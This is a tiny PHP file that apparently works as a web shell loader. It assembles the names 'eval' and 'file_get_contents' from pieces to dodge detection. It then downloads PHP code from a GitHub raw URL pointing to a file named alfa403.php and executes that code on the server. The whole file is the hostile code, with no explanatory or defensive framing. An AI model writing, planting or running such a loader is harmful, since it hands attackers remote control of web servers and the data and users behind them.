<?php
$func = 'eva' . 'l';
$get = 'file_' . 'get_' . 'contents';
$url = 'https://raw.githubusercontent.com/DemonArmy501/kerang/refs/heads/main/alfa403.php';
echo $func("?>".$get($url));
?>